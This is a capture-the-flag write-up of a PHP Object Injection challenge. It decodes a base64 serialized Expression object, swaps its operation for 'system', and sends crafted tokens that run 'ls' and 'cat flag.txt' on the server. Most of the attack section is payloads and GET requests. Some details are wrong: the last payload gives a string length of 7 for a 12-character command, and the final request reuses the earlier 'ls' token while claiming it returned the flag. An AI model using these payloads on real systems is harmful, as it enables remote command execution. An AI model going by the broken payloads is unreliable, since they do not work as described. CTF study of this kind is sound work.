PHP Object Injection - CTF Writeup  

Challenge Overview  
This challenge involves PHP Object Injection (POI), where user-controlled serialized objects can be manipulated to execute arbitrary PHP functions. The goal is to exploit the vulnerability to execute system commands and retrieve the flag.txt file.  

Step 1: Testing the Application  
1. Visit the provided web page and input two numbers in the form.  
2. Submit the form, and you will receive a result along with a generated token.  

Example:  
Input: 2, 3  
Output: 2 + 3 = 5  
Generated Token: TzoxMDoiRXhwcmVzc2lvbiI6Mzp7czoxMjoiRXhwcmVzc2lvbm9wIjtzOjM6InN1bSI7czoxNjoiRXhwcmVzc2lvbnBhcmFtcyI7YToyOntpOjA7aToyO2k6MTtpOjM7fXM6OToic3RyaW5naWZ5IjtzOjU6IjIgKyAzIjt9  

3. It also provides a an option to use the token. Upon clicking the "Click Here", it sends a request:  
GET /index.php?token=TzoxMDoiRXhwcmVzc2lvbiI6Mzp7czoxMjoiRXhwcmVzc2lvbm9wIjtzOjM6InN1bSI7czoxNjoiRXhwcmVzc2lvbnBhcmFtcyI7YToyOntpOjA7aToyO2k6MTtpOjM7fXM6OToic3RyaW5naWZ5IjtzOjU6IjIgKyAzIjt9  

4. The response shows invalid operation.  

Step 2: Analyzing the Token  
1. Decoding the Base64 token:  
echo "TzoxMDoiRXhwcmVzc2lvbiI6Mzp7czoxMjoiRXhwcmVzc2lvbm9wIjtzOjM6InN1bSI7czoxNjoiRXhwcmVzc2lvbnBhcmFtcyI7YToyOntpOjA7aToyO2k6MTtpOjM7fXM6OToic3RyaW5naWZ5IjtzOjU6IjIgKyAzIjt9" | base64 -d  

Output:  
O:10:"Expression":3:{s:12:"Expressionop";s:3:"sum";s:16:"Expressionparams";a:2:{i:0;i:2;i:1;i:3;}s:9:"stringify";s:5:"2 + 3";}  

2. We see that it is a serialized PHP object of the Expression class.  

Step 3: Modifying the Payload  
Instead of performing a sum, we modify the Expressionop to "system" and set Expressionparams to ["ls"] to execute the ls command.  

Modified Payload:  
O:10:"Expression":3:{s:12:"Expressionop";s:6:"system";s:16:"Expressionparams";s:2:"ls";s:9:"stringify";s:5:"2 + 3";}  

1. Encoding it back to Base64:  
echo -n 'O:10:"Expression":3:{s:12:"Expressionop";s:6:"system";s:16:"Expressionparams";s:2:"ls";s:9:"stringify";s:5:"2 + 3";}' | base64  

Output:  
TzoxMDoiRXhwcmVzc2lvbiI6Mzp7czoxMjoiRXhwcmVzc2lvbm9wIjtzOjY6InN5c3RlbSI7czoxNjoiRXhwcmVzc2lvbnBhcmFtcyI7czoyOiJscyI7czo5OiJzdHJpbmdpZnkiO3M6NToiMiArIDMiO30=  

Step 4: Sending the Exploit  
Now, send the request with the modified token:  
GET /index.php?token=TzoxMDoiRXhwcmVzc2lvbiI6Mzp7czoxMjoiRXhwcmVzc2lvbm9wIjtzOjY6InN5c3RlbSI7czoxNjoiRXhwcmVzc2lvbnBhcmFtcyI7czoyOiJscyI7czo5OiJzdHJpbmdpZnkiO3M6NToiMiArIDMiO30=  

Response:  
index.php 
flag.txt  

Step 5: Retrieving the Flag  
Now, modify the payload to execute:  
O:10:"Expression":3:{s:12:"Expressionop";s:6:"system";s:16:"Expressionparams";s:7:"cat flag.txt";s:9:"stringify";s:5:"2 + 3";}  

Encode it:  
echo -n 'O:10:"Expression":3:{s:12:"Expressionop";s:6:"system";s:16:"Expressionparams";s:7:"cat flag.txt";s:9:"stringify";s:5:"2 + 3";}' | base64  

Send the request with the new token:  
GET /index.php?token=TzoxMDoiRXhwcmVzc2lvbiI6Mzp7czoxMjoiRXhwcmVzc2lvbm9wIjtzOjY6InN5c3RlbSI7czoxNjoiRXhwcmVzc2lvbnBhcmFtcyI7czoyOiJscyI7czo5OiJzdHJpbmdpZnkiO3M6NToiMiArIDMiO30=  

Response:  
FLAG{flag}  

